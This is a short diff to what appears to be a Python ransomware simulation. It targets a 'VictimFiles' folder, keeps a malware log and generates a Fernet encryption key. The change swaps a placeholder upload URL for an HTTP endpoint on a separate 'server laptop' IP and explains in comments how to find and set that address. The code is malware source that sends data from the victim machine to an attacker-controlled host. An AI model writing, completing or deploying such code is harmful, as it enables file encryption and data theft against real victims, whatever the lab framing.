@@ -6,8 +6,11 @@ from datetime import datetime
 VICTIM_FOLDER = "./VictimFiles"
 LOG_FILE = "./malware_log.txt"
 
-# Placeholder API — You will give me your real API!
-API_URL = "https://example.com/api/upload"
+# ===== IMPORTANT: Configure this with your SERVER LAPTOP IP =====
+# On SERVER laptop, run: ipconfig (Windows) and find IPv4 Address
+# Example: "192.168.x.x" or "10.x.x.x"
+SERVER_IP = "192.168.1.100"  # <-- CHANGE THIS to your server's IP
+API_URL = f"http://{SERVER_IP}:5000/upload"
 
 # Generate encryption key (simulation)
 key = Fernet.generate_key()
